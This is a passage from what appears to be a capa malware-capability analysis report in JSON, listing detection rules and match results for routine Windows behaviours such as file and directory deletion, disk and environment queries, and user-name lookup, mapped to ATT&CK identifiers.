        "source": "rule:\r\n  meta:\r\n    name: delete file\r\n    namespace: host-interaction/file-system/delete\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - File System::Delete File [C0047]\r\n    examples:\r\n      - 946A99F36A46D335DEC080D9A4371940:0x100015F0\r\n      # MoveFileEx\r\n      - 31600AD0D1A7EA615690DF111AE36C73:0x401A15\r\n      # NtDeleteFile\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140001E04\r\n  features:\r\n    - or:\r\n      - api: kernel32.DeleteFile\r\n      - api: DeleteFileTransacted\r\n      - api: NtDeleteFile\r\n      - api: ZwDeleteFile\r\n      - api: remove\r\n      - api: _wremove\r\n      - api: System.IO.File::Delete\r\n      - api: System.IO.FileSystemInfo::Delete\r\n      # static\r\n      - basic block:\r\n        - and:\r\n          - number: 3 = FO_DELETE\r\n          - or:\r\n            - api: kernel32.SHFileOperation\r\n      - basic block:\r\n        - and:\r\n          - number: 4 = MOVEFILE_DELAY_UNTIL_REBOOT\r\n          - number: 0 = NULL\r\n          - api: MoveFileEx\r\n      # dynamic\r\n      - call:\r\n        - and:\r\n          - number: 3 = FO_DELETE\r\n          - or:\r\n            - api: kernel32.SHFileOperation\r\n      - call:\r\n        - and:\r\n          - number: 4 = MOVEFILE_DELAY_UNTIL_REBOOT\r\n          - number: 0 = NULL\r\n          - api: MoveFileEx\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651788336
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788589
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFileTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "remove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "_wremove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileSystemInfo::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/eb59940490ae4bdc985d21ad57984375"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/2ca9c016ca7b46d991538a77e51c9826"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/f152417174e448f88f86f7f762096b49"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/bac0999d55b94027afafb8a5341c7c42"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651791328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791882
                    },
                    {
                      "type": "absolute",
                      "value": 1651791748
                    },
                    {
                      "type": "absolute",
                      "value": 1651791725
                    },
                    {
                      "type": "absolute",
                      "value": 1651791855
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFileTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "remove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "_wremove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileSystemInfo::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/eb59940490ae4bdc985d21ad57984375"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/2ca9c016ca7b46d991538a77e51c9826"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/f152417174e448f88f86f7f762096b49"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/bac0999d55b94027afafb8a5341c7c42"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651797440
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651797584
                    },
                    {
                      "type": "absolute",
                      "value": 1651797689
                    },
                    {
                      "type": "absolute",
                      "value": 1651798602
                    },
                    {
                      "type": "absolute",
                      "value": 1651798621
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "DeleteFileTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwDeleteFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "remove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "_wremove"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileSystemInfo::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/eb59940490ae4bdc985d21ad57984375"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/2ca9c016ca7b46d991538a77e51c9826"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/f152417174e448f88f86f7f762096b49"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "delete file/bac0999d55b94027afafb8a5341c7c42"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get session user name": {
        "meta": {
          "name": "get session user name",
          "namespace": "host-interaction/session",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Owner/User Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Owner/User Discovery",
              "subtechnique": "",
              "id": "T1033"
            },
            {
              "parts": [
                "Discovery",
                "Account Discovery"
              ],
              "tactic": "Discovery",
              "technique": "Account Discovery",
              "subtechnique": "",
              "id": "T1087"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-01.exe_:0x401285"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get session user name\r\n    namespace: host-interaction/session\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::System Owner/User Discovery [T1033]\r\n      - Discovery::Account Discovery [T1087]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-01.exe_:0x401285\r\n  features:\r\n    - or:\r\n      - api: advapi32.GetUserName\r\n      - api: secur32.GetUserNameEx\r\n      - basic block:\r\n        - and:\r\n          # - match: get session information (see #463)\r\n          - api: wtsapi32.WTSQuerySessionInformation\r\n          - number: 5 = WTSUserName\r\n      - call:\r\n        - and:\r\n          - api: wtsapi32.WTSQuerySessionInformation\r\n          - number: 5 = WTSUserName\r\n      - api: System.Security.Principal.WindowsIdentity::GetCurrent\r\n      - property/read: System.Environment::UserName\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651788624
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788888
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/0727956844ee4b31b52fcd077f03e28c"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/561ca517615c4f95bfc1fd497aefd800"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Security.Principal.WindowsIdentity::GetCurrent"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::UserName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get disk information": {
        "meta": {
          "name": "get disk information",
          "namespace": "host-interaction/hardware/storage",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "objective": "Discovery",
              "behavior": "System Information Discovery",
              "method": "",
              "id": "E1082"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x4052A0",
            "972B219F18379907A045431303F4DA7D:0x41064E"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get disk information\r\n    namespace: host-interaction/hardware/storage\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    mbc:\r\n      - Discovery::System Information Discovery [E1082]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4052A0\r\n      - 972B219F18379907A045431303F4DA7D:0x41064E\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetDriveType\r\n      - api: kernel32.GetLogicalDrives\r\n      - api: kernel32.GetVolumeInformation\r\n      - api: kernel32.GetVolumeNameForVolumeMountPoint\r\n      - api: kernel32.GetVolumePathNamesForVolumeName\r\n      - api: kernel32.GetLogicalDriveStrings\r\n      - api: kernel32.QueryDosDevice\r\n      - property/read: System.IO.DriveInfo::VolumeLabel\r\n      - property/read: System.IO.DriveInfo::DriveType\r\n      - property/read: System.IO.DriveInfo::DriveFormat\r\n      - property/read: System.IO.DriveInfo::Name\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651788624
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetDriveType"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetLogicalDrives"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetVolumeInformation"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651788729
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetVolumeNameForVolumeMountPoint"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetVolumePathNamesForVolumeName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetLogicalDriveStrings"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "QueryDosDevice"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.DriveInfo::VolumeLabel"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.DriveInfo::DriveType"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.DriveInfo::DriveFormat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.DriveInfo::Name"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "query environment variable": {
        "meta": {
          "name": "query environment variable",
          "namespace": "host-interaction/environment-variable",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "@_re_fox"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "objective": "Discovery",
              "behavior": "System Information Discovery",
              "method": "",
              "id": "E1082"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-02.exe_:0x401880",
            "0761142efbda6c4b1e801223de723578:0x65483490"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: query environment variable\r\n    namespace: host-interaction/environment-variable\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - \"@_re_fox\"\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    mbc:\r\n      - Discovery::System Information Discovery [E1082]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-02.exe_:0x401880\r\n      - 0761142efbda6c4b1e801223de723578:0x65483490\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetEnvironmentVariable\r\n      - api: kernel32.GetEnvironmentStrings\r\n      - api: kernel32.ExpandEnvironmentStrings\r\n      - api: msvcr90.getenv\r\n      - api: msvcrt.getenv\r\n      - api: System.Environment::GetEnvironmentVariable\r\n      - api: System.Environment::GetEnvironmentVariables\r\n      - api: System.Environment::ExpandEnvironmentVariables\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651791328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetEnvironmentVariable"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetEnvironmentStrings"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ExpandEnvironmentStrings"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791621
                    },
                    {
                      "type": "absolute",
                      "value": 1651791606
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "getenv"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetEnvironmentVariable"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetEnvironmentVariables"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::ExpandEnvironmentVariables"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "delete directory": {
        "meta": {
          "name": "delete directory",
          "namespace": "host-interaction/file-system/delete",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Delete Directory"
              ],
              "objective": "File System",
              "behavior": "Delete Directory",
              "method": "",
              "id": "C0048"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 05-01.dll_:0x10009236",
            "AFB6EC3D721A5CB67863487B0E51A34C167F629CF701F8BC7A038C117B4DDA44:0x429AA0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: delete directory\r\n    namespace: host-interaction/file-system/delete\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Delete Directory [C0048]\r\n    examples:\r\n      - Practical Malware Analysis Lab 05-01.dll_:0x10009236\r\n      - AFB6EC3D721A5CB67863487B0E51A34C167F629CF701F8BC7A038C117B4DDA44:0x429AA0\r\n  features:\r\n    - or:\r\n      - api: RemoveDirectory\r\n      - api: RemoveDirectoryTransacted\r\n      - api: rmdir\r\n      - api: _rmdir\r\n      - api: _wrmdir\r\n      - api: System.IO.DirectoryInfo::Delete\r\n      - api: System.IO.Directory::Delete\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651791328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RemoveDirectory"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791904
                    },
                    {
                      "type": "absolute",
                      "value": 1651791898
                    },
                    {
                      "type": "absolute",
                      "value": 1651792040
                    },
                    {
                      "type": "absolute",
                      "value": 1651792034
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RemoveDirectoryTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "rmdir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "_rmdir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "_wrmdir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.DirectoryInfo::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Directory::Delete"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "check if file exists": {
        "meta": {
          "name": "check if file exists",
          "namespace": "host-interaction/file-system/exists",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "tactic": "Discovery",
              "technique": "File and Directory Discovery",
              "subtechnique": "",
              "id": "T1083"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "objective": "Discovery",
              "behavior": "File and Directory Discovery",
              "method": "",
              "id": "E1083"
            }
          ],
          "references": [],
          "examples": [
            "31600AD0D1A7EA615690DF111AE36C73:0x401284"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: check if file exists\r\n    namespace: host-interaction/file-system/exists\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::File and Directory Discovery [T1083]\r\n    mbc:\r\n      - Discovery::File and Directory Discovery [E1083]\r\n    examples:\r\n      - 31600AD0D1A7EA615690DF111AE36C73:0x401284\r\n  features:\r\n    - or:\r\n      - basic block:\r\n        - and:\r\n          - api: kernel32.GetFileAttributes\r\n          - instruction:\r\n            - mnemonic: cmp\r\n            - number: 0xFFFFFFFF = INVALID_FILE_ATTRIBUTES\r\n      - basic block:\r\n        - and:\r\n          - api: kernel32.GetLastError\r\n          - instruction:\r\n            - mnemonic: cmp\r\n            - number: 2 = ERROR_FILE_NOT_FOUND\r\n      - api: shlwapi.PathFileExists\r\n      - api: System.IO.File::Exists\r\n      - property/read: System.IO.FileSystemInfo::Exists\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651791328
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "GetFileAttributes"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791706
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "instruction"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "cmp"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791712
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 4294967295,
                                      "description": "INVALID_FILE_ATTRIBUTES"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791712
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791712
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "GetFileAttributes"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651791836
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "instruction"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "cmp"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651791842
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
